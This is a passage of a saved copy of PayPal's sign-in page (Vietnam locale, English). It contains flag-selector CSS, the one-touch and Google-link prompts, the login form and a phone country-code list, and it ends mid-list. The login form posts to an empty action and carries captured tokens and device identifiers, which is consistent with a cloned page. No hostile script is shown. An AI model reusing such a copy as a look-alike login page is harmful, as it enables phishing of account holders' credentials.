            background-position: 5px -1994px;
        }
        
        .country-selector .NF,
        .country-selector .norfolkisland {
            background-position: 5px -2204px;
        }
        
        .country-selector .papuanewguinea,
        .country-selector .PG {
            background-position: 5px -1784px;
        }
        
        .country-selector .PE,
        .country-selector .peru {
            background-position: 5px -1854px;
        }
        
        .country-selector .CG,
        .country-selector .republicofcongo {
            background-position: 5px -5284px;
        }
        
        .country-selector .senegal,
        .country-selector .SN {
            background-position: 5px -1119px;
        }
        
        .country-selector .RS,
        .country-selector .serbia {
            background-position: 5px -6718px;
        }
        
        .country-selector .sierraleone,
        .country-selector .SL {
            background-position: 5px -1189px;
        }
        
        .country-selector .SB,
        .country-selector .solomonislands {
            background-position: 5px -1399px;
        }
        
        .country-selector .SO,
        .country-selector .somalia {
            background-position: 5px -1084px;
        }
        
        .country-selector .LK,
        .country-selector .srilanka {
            background-position: 5px -3009px;
        }
        
        .country-selector .SH,
        .country-selector .sthelena {
            background-position: 5px -909px;
        }
        
        .country-selector .SR,
        .country-selector .suriname {
            background-position: 5px -1049px;
        }
        
        .country-selector .swaziland,
        .country-selector .SZ {
            background-position: 5px -6509px;
        }
        
        .country-selector .SJ,
        .country-selector .svalbardandjanmayen {
            background-position: 5px -2099px;
        }
        
        .country-selector .tanzania,
        .country-selector .TZ {
            background-position: 5px -489px;
        }
        
        .country-selector .TG,
        .country-selector .togo {
            background-position: 5px -839px;
        }
        
        .country-selector .TO,
        .country-selector .tonga {
            background-position: 5px -664px;
        }
        
        .country-selector .TN,
        .country-selector .tunisia {
            background-position: 5px -699px;
        }
        
        .country-selector .TM,
        .country-selector .turkmenistan {
            background-position: 5px -734px;
        }
        
        .country-selector .TC,
        .country-selector .turksandcaicos {
            background-position: 5px -909px;
        }
        
        .country-selector .tuvalu,
        .country-selector .TV {
            background-position: 5px -559px;
        }
        
        .country-selector .UG,
        .country-selector .uganda {
            background-position: 5px -419px;
        }
        
        .country-selector .UA,
        .country-selector .ukraine {
            background-position: 5px -454px;
        }
        
        .country-selector .VA,
        .country-selector .vaticancity {
            background-position: 5px -314px;
        }
        
        .country-selector .VG,
        .country-selector .virginislands {
            background-position: 5px -209px;
        }
        
        .country-selector .wallisandfutuna,
        .country-selector .WF {
            background-position: 5px -6792px;
        }
        
        .country-selector .ME,
        .country-selector .montenegro {
            background-position: 5px -6859px;
        }
        
        .country-selector .macedonia,
        .country-selector .MK {
            background-position: 5px -6894px;
        }
        
        .country-selector .MD,
        .country-selector .moldova {
            background-position: 5px -6929px;
        }
        
        .country-selector .kosovo,
        .country-selector .XK {
            background-position: 5px -6964px;
        }
        
        .country-selector .belarus,
        .country-selector .BY {
            background-position: 5px -6999px;
        }
        
        .country-selector .MC,
        .country-selector .monaco {
            background-position: 5px -7034px;
        }
        
        .country-selector .NG,
        .country-selector .nigeria {
            background-position: 5px -7069px;
        }
        
        .country-selector .GH,
        .country-selector .ghana {
            background-position: 5px -7104px;
        }
        
        .country-selector .CI,
        .country-selector .cotedivoire {
            background-position: 5px -7139px;
        }
        
        .country-selector .cameroon,
        .country-selector .CM {
            background-position: 5px -7174px;
        }
        
        .country-selector .zimbabwe,
        .country-selector .ZW {
            background-position: 5px -7209px;
        }
        
        .country-selector .paraguay,
        .country-selector .PY {
            background-position: 5px -7244px;
        }
        
        @media all and (max-width: 767px) {
            .country-selector ul li {
                display: block;
                width: 100%;
            }
            .priorityCountries span::before {
                font-size: 3em;
                float: right;
                padding-right: 10px;
            }
        }
        
        ul.priorityCountries li:first-child a:visited,
        ul.priorityCountries li:first-child a:hover {
            text-decoration: none;
        }
        
        @media all and (min-width: 768px) {
            .priorityCountries span::before {
                content: none;
            }
        }
        
        .countryListModal {
            position: absolute;
            top: 100%;
            transition: all 0.3s ease-out;
            min-height: 100vh;
            min-width: 100vw;
            background: #fff;
            z-index: 999999;
            opacity: 1;
        }
        
        .countryListModal.transitionUp {
            top: 0;
        }
        
        .countryListModal .wrapper {
            margin: 0 auto;
            width: 70%;
        }
        
        @media all and (max-width: 767px) {
            .countryListModal .wrapper {
                width: 100%;
            }
        }
        
        .countryListModal .buttonHolder {
            min-height: 7rem;
            position: fixed;
            width: 70%;
        }
        
        .countryListModal .ghostElement {
            /* hides behind fixed button holder */
            
            height: 7rem;
        }
        
        .countryListModal .modalContent {
            padding-left: 10px;
        }
        
        @media all and (max-width: 767px) {
            .countryListModal .buttonHolder {
                min-height: 5rem;
                width: 100%;
            }
            .countryListModal .ghostElement {
                height: 5rem;
            }
            .countryListModal .closeModal::before {
                /* to align with the selector icon */
                
                padding-right: 20px;
            }
        }
        
        .countryListModal .closeModal {
            background: none;
            border: none;
            padding: 0 4px 0;
            float: right;
            color: #2c2e2f;
            cursor: pointer;
            height: 40px;
            font-size: 2em;
        }
        
        .countryListModal .paypalIcon {
            background: url(https://www.paypalobjects.com/webstatic/i/consumer/onboarding/icon_PP_monogram_2x.png) center 14px no-repeat #fff;
            background-size: 20px;
        }
        
        .picker.country-selector {
            display: inline-block;
            vertical-align: middle;
            position: relative;
        }
        
        .picker.country-selector button {
            display: inline-block;
            margin-right: 30px;
            cursor: pointer;
        }
        
        .picker.country-selector button::after {
            content: '';
            position: absolute;
            bottom: 10px;
            height: 8px;
            width: 8px;
            left: 30px;
            margin: 8px 0 0 8px;
            border-color: #333;
            border-image: none;
            border-style: solid;
            border-width: 1px 1px 0 0;
            -webkit-transform: rotate(135deg);
            -moz-transform: rotate(135deg);
            -o-transform: rotate(135deg);
            -ms-transform: rotate(135deg);
            transform: rotate(135deg);
        }
    </style>
</head>

<body class="desktop" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfQFXQmqI%2FDzqy1%2BXN7DvrO8S8zeXuBzJGCSBq%2FvBnopI_19301db639b" data-hostname="rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLtszw3WODnX1tylUA20e0JneTVBJVge66" data-production="true" data-enable-ads-captcha="true" data-disable-ads-challenge="true" data-ads-challenge-url="/auth/createchallenge/8d042310e93e6569/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="0121526614057" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true" data-is-hybrid-login-experience="true" data-is-hybrid-editable-on-cookied="true" data-phone-code="VN +84" data-csrf-token="SJ1BzeOy93OrM/Mz5A0e00pkYxmWLZsdKAiqM=" data-nonce="BZUfxO1emNdpOlbxmkrY5a8lCatVjjU2bqgwvsQzuv7rZTUp" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true" data-web-authn-support-lookup="true" data-show-country-drop-down="true" data-otp-login-integration-type="via_button" data-email-label="Email address" data-xhr-timeout-limit="20000" data-load-start-time="1730902975387" data-is-cookied-user="true" data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10" data-cookie-banner-variant="hidden" data-device-o-s="Windows 10" data-browser-name="Chrome" data-pass-key-platform="true" data-c-override="21f7f170c2034cb3ae304675095f54ae" data-rp-id="www.paypal.com" data-device_identifier="a7f653a911bd481d81b9f7ba919de90a1730895736230" data-did_set="true" data-dpop-key="login_key" data-allow-passkey-autofill="true" data-is-uvpaa-exist="false">
    <noscript>
        <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p>
    </noscript>
    <div id="main" class="main" role="main">
        <section id="slLanding" class="slLanding hide" data-role="page" data-title="Connect your Google account, check out faster on your devices">
            <div class="corral">
                <div id="slContent" class="contentContainer contentContainerBordered">
                    <header>
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
                    </header>
                    <div id="linked" class="linked ">
                        <div class="profileRemembered"><span class="loginEmail"></span><a href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" class="changeLink scTrack:not-you" id="changeLink" pa-marked="1">Change</a>
                        </div>
                        <div class="headerTextDecorated"></div>
                        <h1 class="headerText">Stay logged in for faster checkout</h1>
                        <p class="description assure">Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)<span class="learnMoreLink"><a href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">What's this?</a></span>
                        </p>
                        <div id="partnerProfile" class="partnerProfile">
                            <div id="partnerPhoto" class="partnerPhoto" style="background-image: url(&#39;&#39;)"></div>
                            <div class="partnerDetails"><span>You're logged in as</span>
                                <div id="displayName" class="displayName"></div>
                                <div>
                                    <div class="partnerEmailDiv"><span class="partnerIcon"></span><span id="partnerEmail" class="partnerEmail"></span><span id="partnerEmailDomain"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="actions actionsSpacedShort">
                            <button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn" pa-marked="1">Continue</button>
                        </div>
                        <div id="secondaryLogin" class="buttonAsLink secondaryLink">
                            <button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn" pa-marked="1">Use password instead</button>
                        </div>
                    </div>
                    <div id="unlinked" class="unlinked ">
                        <div id="headerIcon" class="partnerConnect"></div>
                        <h1 class="headerText">Connect your Google account, check out faster on your devices</h1>
                        <p class="description assure">Automatically log in to PayPal for faster checkout without typing your password wherever you're logged in with your Google account.<a href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" id="slOptInlearnMore" class="secondayLink scTrack:unifiedlogin-sl-whatsthis" pa-marked="1">What's this?</a>
                        </p>
                        <p class="secondaryLink hide" id="slOptIn_notNow"><a href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" pa-marked="1">Not now</a>
                        </p>
                    </div>
                    <div id="learnMoreModal" class="learnMoreModal">
                        <div id="optInLearnMoreDesc" class="optInLearnMoreDesc ">
                            <h1 class="headerText headerTextSpaced">Why connect my Google account?</h1>
                            <p> Linking your Google account allows you to activate One Touch quickly and easily when you check out. You can always opt out later in Settings at PayPal.com.</p>
                            <p> Whenever you check out on a new device and browser when logged in with your Google account, you can automatically log in at checkout without typing your password.</p>
                        </div>
                        <div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc ">
                            <h1 class="headerText headerTextSpaced">Stay logged in for faster checkout</h1>
                            <p> Skip typing your password by staying logged in on this device. For security, we'll occassionally ask you to log in, including every time you update your personal or financial info. We don't recommend using One Touch on shared devices. Turn this off at any time in your PayPal settings.</p>
                        </div>
                        <button type="button" class="ui-dialog-titlebar-close" pa-marked="1"></button>
                    </div>
                    <div class="intentFooter ">
                        <div class="localeSelector  "><span class="picker country-selector"><span class="hide" id="countryPickerLink">Vietnam</span>
                            <button type="button" aria-label="countryPickerLink" class="country VN" pa-marked="1"></button>
                            </span>
                            <ul class="localeLink">
                                <li><a class=" scTrack:unifiedlogin-footer-language_vi_VN" href="https://www.paypal.com/signin?Z3JncnB0=&amp;country.x=VN&amp;locale.x=vi_VN&amp;langTgl=vi" lang="en" data-locale="vi_VN" pa-marked="1">Tiếng Việt</a>
                                </li>
                                <li><a class="selected scTrack:unifiedlogin-footer-language_en_US" href="https://www.paypal.com/signin?Z3JncnB0=&amp;country.x=VN&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US" aria-current="”true”" pa-marked="1">English</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="login" class="login  " data-role="page" data-title="Log in to your PayPal account">
            <div class="corral ">
                <div id="content" class="contentContainer activeContent contentContainerBordered">
                    <header id="header">
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
                    </header>
                    <h1 id="headerText" class="headerText  accessAid"><ya-tr-span data-index="0-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Log in to your PayPal account" data-translation="Đăng nhập vào tài khoản PayPal" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Log in to your PayPal account</ya-tr-span></h1>
                    <p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Type it below. Otherwise, click the link to log in with email.</p>
                    <p id="subTagLineConnectOtp" class="subHeaderText hide">Forgot your email address? Go to the PayPal website to recover it.</p>
                    <div id="loginContent" class="">
                        <div id="loginSection" class="">
                            <div class="notifications"></div>
                            <div id="keychainErrorMessage" class="hide">
                                <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ only works for checkout. Please login with your email.</p>
                                <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
                                <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
                            </div>
                            <form id="loginForm" action="" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate="">
                                <input type="hidden" id="token" name="_csrf" value="SJ1BzeOy93OrM/Mz5A0e00pkYxmWLZsdKAiqM=">
                                <input type="hidden" name="locale.x" value="en_US">
                                <input type="hidden" name="processSignin" value="main">
                                <input type="hidden" name="fn_sync_data" value="fn_sync_data">
                                <input type="hidden" name="intent" value="signin">
                                <input type="hidden" name="ads-client-context" value="signin">
                                <input type="hidden" name="isValidCtxId" value="">
                                <input type="hidden" name="coBrand" value="vn">
                                <input type="hidden" name="signUpEndPoint" value="/webapps/mpp/account-selection">
                                <input type="hidden" name="showCountryDropDown" value="true">
                                <input type="hidden" name="usePassKey" value="true">
                                <input type="hidden" name="requestUrl" value="/signin?country.x=VN&amp;locale.x=en_US&amp;Z3JncnB0=">
                                <input type="hidden" name="forcePhonePasswordOptIn" value="">
                                <div id="passwordSection" class="clearfix splitEmail">
                                    <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                                        <div class="countryPhoneSelectWrapper hide">
                                            <label class="accessAid" for="phoneCode">Choose your phone country code</label>
                                            <select name="phoneCode" id="phoneCode" class="countryPhoneSelect">
                                                <option value="AL +355" data-code="+355" data-country="AL">Albania (+355)</option>
                                                <option value="DZ +213" data-code="+213" data-country="DZ">Algeria (+213)</option>
                                                <option value="AD +376" data-code="+376" data-country="AD">Andorra (+376)</option>
                                                <option value="AO +244" data-code="+244" data-country="AO">Angola (+244)</option>
                                                <option value="AI +1" data-code="+1" data-country="AI">Anguilla (+1)</option>
                                                <option value="AG +1" data-code="+1" data-country="AG">Antigua &amp; Barbuda (+1)</option>
                                                <option value="AR +54" data-code="+54" data-country="AR">Argentina (+54)</option>
                                                <option value="AM +374" data-code="+374" data-country="AM">Armenia (+374)</option>
                                                <option value="AW +297" data-code="+297" data-country="AW">Aruba (+297)</option>
                                                <option value="AU +61" data-code="+61" data-country="AU">Australia (+61)</option>
                                                <option value="AT +43" data-code="+43" data-country="AT">Austria (+43)</option>
                                                <option value="AZ +994" data-code="+994" data-country="AZ">Azerbaijan (+994)</option>
                                                <option value="BS +1" data-code="+1" data-country="BS">Bahamas (+1)</option>
                                                <option value="BH +973" data-code="+973" data-country="BH">Bahrain (+973)</option>
                                                <option value="BB +1" data-code="+1" data-country="BB">Barbados (+1)</option>
                                                <option value="BY +375" data-code="+375" data-country="BY">Belarus (+375)</option>
                                                <option value="BE +32" data-code="+32" data-country="BE">Belgium (+32)</option>
                                                <option value="BZ +501" data-code="+501" data-country="BZ">Belize (+501)</option>
                                                <option value="BJ +229" data-code="+229" data-country="BJ">Benin (+229)</option>
                                                <option value="BM +1" data-code="+1" data-country="BM">Bermuda (+1)</option>
                                                <option value="BT +975" data-code="+975" data-country="BT">Bhutan (+975)</option>
                                                <option value="BO +591" data-code="+591" data-country="BO">Bolivia (+591)</option>
                                                <option value="BA +387" data-code="+387" data-country="BA">Bosnia &amp; Herzegovina (+387)</option>
                                                <option value="BW +267" data-code="+267" data-country="BW">Botswana (+267)</option>
                                                <option value="BR +55" data-code="+55" data-country="BR">Brazil (+55)</option>
                                                <option value="VG +1" data-code="+1" data-country="VG">British Virgin Islands (+1)</option>
                                                <option value="BN +673" data-code="+673" data-country="BN">Brunei (+673)</option>
                                                <option value="BG +359" data-code="+359" data-country="BG">Bulgaria (+359)</option>
                                                <option value="BF +226" data-code="+226" data-country="BF">Burkina Faso (+226)</option>
                                                <option value="BI +257" data-code="+257" data-country="BI">Burundi (+257)</option>
                                                <option value="KH +855" data-code="+855" data-country="KH">Cambodia (+855)</option>
                                                <option value="CM +237" data-code="+237" data-country="CM">Cameroon (+237)</option>
                                                <option value="CA +1" data-code="+1" data-country="CA">Canada (+1)</option>
                                                <option value="CV +238" data-code="+238" data-country="CV">Cape Verde (+238)</option>
                                                <option value="KY +1" data-code="+1" data-country="KY">Cayman Islands (+1)</option>
                                                <option value="TD +235" data-code="+235" data-country="TD">Chad (+235)</option>
                                                <option value="CL +56" data-code="+56" data-country="CL">Chile (+56)</option>
                                                <option value="CN +86" data-code="+86" data-country="CN">China (+86)</option>
                                                <option value="CO +57" data-code="+57" data-country="CO">Colombia (+57)</option>
                                                <option value="KM +269" data-code="+269" data-country="KM">Comoros (+269)</option>
                                                <option value="CG +242" data-code="+242" data-country="CG">Congo - Brazzaville (+242)</option>
                                                <option value="CD +243" data-code="+243" data-country="CD">Congo - Kinshasa (+243)</option>
                                                <option value="CK +682" data-code="+682" data-country="CK">Cook Islands (+682)</option>
                                                <option value="CR +506" data-code="+506" data-country="CR">Costa Rica (+506)</option>
                                                <option value="CI +225" data-code="+225" data-country="CI">Côte d’Ivoire (+225)</option>
                                                <option value="HR +385" data-code="+385" data-country="HR">Croatia (+385)</option>
                                                <option value="CY +357" data-code="+357" data-country="CY">Cyprus (+357)</option>
                                                <option value="CZ +420" data-code="+420" data-country="CZ">Czechia (+420)</option>
                                                <option value="DK +45" data-code="+45" data-country="DK">Denmark (+45)</option>
                                                <option value="DJ +253" data-code="+253" data-country="DJ">Djibouti (+253)</option>
                                                <option value="DM +1" data-code="+1" data-country="DM">Dominica (+1)</option>
                                                <option value="DO +1" data-code="+1" data-country="DO">Dominican Republic (+1)</option>
                                                <option value="EC +593" data-code="+593" data-country="EC">Ecuador (+593)</option>
                                                <option value="EG +20" data-code="+20" data-country="EG">Egypt (+20)</option>
                                                <option value="SV +503" data-code="+503" data-country="SV">El Salvador (+503)</option>
                                                <option value="ER +291" data-code="+291" data-country="ER">Eritrea (+291)</option>
                                                <option value="EE +372" data-code="+372" data-country="EE">Estonia (+372)</option>
                                                <option value="SZ +268" data-code="+268" data-country="SZ">Eswatini (+268)</option>
                                                <option value="ET +251" data-code="+251" data-country="ET">Ethiopia (+251)</option>
                                                <option value="FK +500" data-code="+500" data-country="FK">Falkland Islands (+500)</option>
                                                <option value="FO +298" data-code="+298" data-country="FO">Faroe Islands (+298)</option>
                                                <option value="FJ +679" data-code="+679" data-country="FJ">Fiji (+679)</option>
                                                <option value="FI +358" data-code="+358" data-country="FI">Finland (+358)</option>
                                                <option value="FR +33" data-code="+33" data-country="FR">France (+33)</option>
                                                <option value="GF +594" data-code="+594" data-country="GF">French Guiana (+594)</option>
                                                <option value="PF +689" data-code="+689" data-country="PF">French Polynesia (+689)</option>
                                                <option value="GA +241" data-code="+241" data-country="GA">Gabon (+241)</option>
                                                <option value="GM +220" data-code="+220" data-country="GM">Gambia (+220)</option>
                                                <option value="GE +995" data-code="+995" data-country="GE">Georgia (+995)</option>
                                                <option value="DE +49" data-code="+49" data-country="DE">Germany (+49)</option>
                                                <option value="GI +350" data-code="+350" data-country="GI">Gibraltar (+350)</option>
                                                <option value="GR +30" data-code="+30" data-country="GR">Greece (+30)</option>
                                                <option value="GL +299" data-code="+299" data-country="GL">Greenland (+299)</option>
                                                <option value="GD +1" data-code="+1" data-country="GD">Grenada (+1)</option>
                                                <option value="GP +590" data-code="+590" data-country="GP">Guadeloupe (+590)</option>
                                                <option value="GT +502" data-code="+502" data-country="GT">Guatemala (+502)</option>
                                                <option value="GN +224" data-code="+224" data-country="GN">Guinea (+224)</option>
                                                <option value="GW +245" data-code="+245" data-country="GW">Guinea-Bissau (+245)</option>
                                                <option value="GY +592" data-code="+592" data-country="GY">Guyana (+592)</option>
                                                <option value="HN +504" data-code="+504" data-country="HN">Honduras (+504)</option>
                                                <option value="HK +852" data-code="+852" data-country="HK">Hong Kong SAR China (+852)</option>
                                                <option value="HU +36" data-code="+36" data-country="HU">Hungary (+36)</option>
                                                <option value="IS +354" data-code="+354" data-country="IS">Iceland (+354)</option>
                                                <option value="IN +91" data-code="+91" data-country="IN">India (+91)</option>
                                                <option value="ID +62" data-code="+62" data-country="ID">Indonesia (+62)</option>
                                                <option value="IE +353" data-code="+353" data-country="IE">Ireland (+353)</option>
                                                <option value="IL +972" data-code="+972" data-country="IL">Israel (+972)</option>
                                                <option value="IT +39" data-code="+39" data-country="IT">Italy (+39)</option>
                                                <option value="JM +1" data-code="+1" data-country="JM">Jamaica (+1)</option>
                                                <option value="JP +81" data-code="+81" data-country="JP">Japan (+81)</option>
                                                <option value="JO +962" data-code="+962" data-country="JO">Jordan (+962)</option>
                                                <option value="KZ +7" data-code="+7" data-country="KZ">Kazakhstan (+7)</option>
                                                <option value="KE +254" data-code="+254" data-country="KE">Kenya (+254)</option>
                                                <option value="KI +686" data-code="+686" data-country="KI">Kiribati (+686)</option>
                                                <option value="KW +965" data-code="+965" data-country="KW">Kuwait (+965)</option>
                                                <option value="KG +996" data-code="+996" data-country="KG">Kyrgyzstan (+996)</option>
                                                <option value="LA +856" data-code="+856" data-country="LA">Laos (+856)</option>
                                                <option value="LV +371" data-code="+371" data-country="LV">Latvia (+371)</option>
                                                <option value="LS +266" data-code="+266" data-country="LS">Lesotho (+266)</option>
                                                <option value="LI +423" data-code="+423" data-country="LI">Liechtenstein (+423)</option>
                                                <option value="LT +370" data-code="+370" data-country="LT">Lithuania (+370)</option>
                                                <option value="LU +352" data-code="+352" data-country="LU">Luxembourg (+352)</option>
                                                <option value="MG +261" data-code="+261" data-country="MG">Madagascar (+261)</option>
                                                <option value="MW +265" data-code="+265" data-country="MW">Malawi (+265)</option>
                                                <option value="MY +60" data-code="+60" data-country="MY">Malaysia (+60)</option>
                                                <option value="MV +960" data-code="+960" data-country="MV">Maldives (+960)</option>
                                                <option value="ML +223" data-code="+223" data-country="ML">Mali (+223)</option>
                                                <option value="MT +356" data-code="+356" data-country="MT">Malta (+356)</option>
                                                <option value="MH +692" data-code="+692" data-country="MH">Marshall Islands (+692)</option>
                                                <option value="MQ +596" data-code="+596" data-country="MQ">Martinique (+596)</option>
                                                <option value="MR +222" data-code="+222" data-country="MR">Mauritania (+222)</option>
                                                <option value="MU +230" data-code="+230" data-country="MU">Mauritius (+230)</option>
                                                <option value="YT +262" data-code="+262" data-country="YT">Mayotte (+262)</option>
                                                <option value="MX +52" data-code="+52" data-country="MX">Mexico (+52)</option>
                                                <option value="FM +691" data-code="+691" data-country="FM">Micronesia (+691)</option>
                                                <option value="MD +373" data-code="+373" data-country="MD">Moldova (+373)</option>
                                                <option value="MC +377" data-code="+377" data-country="MC">Monaco (+377)</option>
                                                <option value="MN +976" data-code="+976" data-country="MN">Mongolia (+976)</option>
                                                <option value="ME +382" data-code="+382" data-country="ME">Montenegro (+382)</option>
                                                <option value="MS +1" data-code="+1" data-country="MS">Montserrat (+1)</option>
                                                <option value="MA +212" data-code="+212" data-country="MA">Morocco (+212)</option>
                                                <option value="MZ +258" data-code="+258" data-country="MZ">Mozambique (+258)</option>
                                                <option value="NA +264" data-code="+264" data-country="NA">Namibia (+264)</option>
                                                <option value="NR +674" data-code="+674" data-country="NR">Nauru (+674)</option>
                                                <option value="NP +977" data-code="+977" data-country="NP">Nepal (+977)</option>
                                                <option value="NL +31" data-code="+31" data-country="NL">Netherlands (+31)</option>
                                                <option value="AN +1" data-code="+1" data-country="AN">Netherlands Antilles (+1)</option>
                                                <option value="NC +687" data-code="+687" data-country="NC">New Caledonia (+687)</option>
                                                <option value="NZ +64" data-code="+64" data-country="NZ">New Zealand (+64)</option>
                                                <option value="NI +505" data-code="+505" data-country="NI">Nicaragua (+505)</option>
                                                <option value="NE +227" data-code="+227" data-country="NE">Niger (+227)</option>
                                                <option value="NG +234" data-code="+234" data-country="NG">Nigeria (+234)</option>
                                                <option value="NU +683" data-code="+683" data-country="NU">Niue (+683)</option>
                                                <option value="NF +672" data-code="+672" data-country="NF">Norfolk Island (+672)</option>
                                                <option value="MK +389" data-code="+389" data-country="MK">North Macedonia (+389)</option>
                                                <option value="NO +47" data-code="+47" data-country="NO">Norway (+47)</option>
                                                <option value="OM +968" data-code="+968" data-country="OM">Oman (+968)</option>
                                                <option value="PW +680" data-code="+680" data-country="PW">Palau (+680)</option>
                                                <option value="PA +507" data-code="+507" data-country="PA">Panama (+507)</option>
                                                <option value="PG +675" data-code="+675" data-country="PG">Papua New Guinea (+675)</option>
                                                <option value="PY +595" data-code="+595" data-country="PY">Paraguay (+595)</option>
                                                <option value="PE +51" data-code="+51" data-country="PE">Peru (+51)</option>
                                                <option value="PH +63" data-code="+63" data-country="PH">Philippines (+63)</option>
                                                <option value="PN +64" data-code="+64" data-country="PN">Pitcairn Islands (+64)</option>
                                                <option value="PL +48" data-code="+48" data-country="PL">Poland (+48)</option>
                                                <option value="PT +351" data-code="+351" data-country="PT">Portugal (+351)</option>
                                                <option value="QA +974" data-code="+974" data-country="QA">Qatar (+974)</option>
                                                <option value="RE +262" data-code="+262" data-country="RE">Réunion (+262)</option>
                                                <option value="RO +40" data-code="+40" data-country="RO">Romania (+40)</option>
                                                <option value="RU +7" data-code="+7" data-country="RU">Russia (+7)</option>
                                                <option value="RW +250" data-code="+250" data-country="RW">Rwanda (+250)</option>
                                                <option value="WS +685" data-code="+685" data-country="WS">Samoa (+685)</option>
                                                <option value="SM +378" data-code="+378" data-country="SM">San Marino (+378)</option>
                                                <option value="ST +239" data-code="+239" data-country="ST">São Tomé &amp; Príncipe (+239)</option>
                                                <option value="SA +966" data-code="+966" data-country="SA">Saudi Arabia (+966)</option>
                                                <option value="SN +221" data-code="+221" data-country="SN">Senegal (+221)</option>
                                                <option value="RS +381" data-code="+381" data-country="RS">Serbia (+381)</option>
                                                <option value="SC +248" data-code="+248" data-country="SC">Seychelles (+248)</option>
                                                <option value="SL +232" data-code="+232" data-country="SL">Sierra Leone (+232)</option>
                                                <option value="SG +65" data-code="+65" data-country="SG">Singapore (+65)</option>
                                                <option value="SK +421" data-code="+421" data-country="SK">Slovakia (+421)</option>
                                                <option value="SI +386" data-code="+386" data-country="SI">Slovenia (+386)</option>
                                                <option value="SB +677" data-code="+677" data-country="SB">Solomon Islands (+677)</option>
                                                <option value="SO +252" data-code="+252" data-country="SO">Somalia (+252)</option>
                                                <option value="ZA +27" data-code="+27" data-country="ZA">South Africa (+27)</option>
                                                <option value="KR +82" data-code="+82" data-country="KR">South Korea (+82)</option>
                                                <option value="ES +34" data-code="+34" data-country="ES">Spain (+34)</option>
                                                <option value="LK +94" data-code="+94" data-country="LK">Sri Lanka (+94)</option>
                                                <option value="SH +44" data-code="+44" data-country="SH">St. Helena (+44)</option>
                                                <option value="KN +1" data-code="+1" data-country="KN">St. Kitts &amp; Nevis (+1)</option>
                                                <option value="LC +1" data-code="+1" data-country="LC">St. Lucia (+1)</option>
                                                <option value="PM +508" data-code="+508" data-country="PM">St. Pierre &amp; Miquelon (+508)</option>
                                                <option value="VC +1" data-code="+1" data-country="VC">St. Vincent &amp; Grenadines (+1)</option>
                                                <option value="SR +597" data-code="+597" data-country="SR">Suriname (+597)</option>
                                                <option value="SJ +47" data-code="+47" data-country="SJ">Svalbard &amp; Jan Mayen (+47)</option>
                                                <option value="SE +46" data-code="+46" data-country="SE">Sweden (+46)</option>
                                                <option value="CH +41" data-code="+41" data-country="CH">Switzerland (+41)</option>
                                                <option value="TW +886" data-code="+886" data-country="TW">Taiwan (+886)</option>
                                                <option value="TJ +992" data-code="+992" data-country="TJ">Tajikistan (+992)</option>
                                                <option value="TZ +255" data-code="+255" data-country="TZ">Tanzania (+255)</option>
                                                <option value="TH +66" data-code="+66" data-country="TH">Thailand (+66)</option>
                                                <option value="TG +228" data-code="+228" data-country="TG">Togo (+228)</option>
                                                <option value="TO +676" data-code="+676" data-country="TO">Tonga (+676)</option>
                                                <option value="TT +1" data-code="+1" data-country="TT">Trinidad &amp; Tobago (+1)</option>
                                                <option value="TN +216" data-code="+216" data-country="TN">Tunisia (+216)</option>
                                                <option value="TR +90" data-code="+90" data-country="TR">Türkiye (+90)</option>
                                                <option value="TM +993" data-code="+993" data-country="TM">Turkmenistan (+993)</option>
                                                <option value="TC +1" data-code="+1" data-country="TC">Turks &amp; Caicos Islands (+1)</option>
                                                <option value="TV +688" data-code="+688" data-country="TV">Tuvalu (+688)</option>
                                                <option value="UG +256" data-code="+256" data-country="UG">Uganda (+256)</option>
                                                <option value="UA +380" data-code="+380" data-country="UA">Ukraine (+380)</option>
                                                <option value="AE +971" data-code="+971" data-country="AE">United Arab Emirates (+971)</option>
                                                <option value="GB +44" data-code="+44" data-country="GB">United Kingdom (+44)</option>
                                                <option value="US +1" data-code="+1" data-country="US">United States (+1)</option>
                                                <option value="UY +598" data-code="+598" data-country="UY">Uruguay (+598)</option>
                                                <option value="VU +678" data-code="+678" data-country="VU">Vanuatu (+678)</option>
                                                <option value="VA +39" data-code="+39" data-country="VA">Vatican City (+39)</option>
                                                <option value="VE +58" data-code="+58" data-country="VE">Venezuela (+58)</option>
                                                <option value="VN +84" data-code="+84" data-country="VN" selected="selected">Vietnam (+84)</option>
                                                <option value="WF +681" data-code="+681" data-country="WF">Wallis &amp; Futuna (+681)</option>
                                                <option value="YE +967" data-code="+967" data-country="YE">Yemen (+967)</option>
                                                <option value="ZM +260" data-code="+260" data-country="ZM">Zambia (+260)</option>
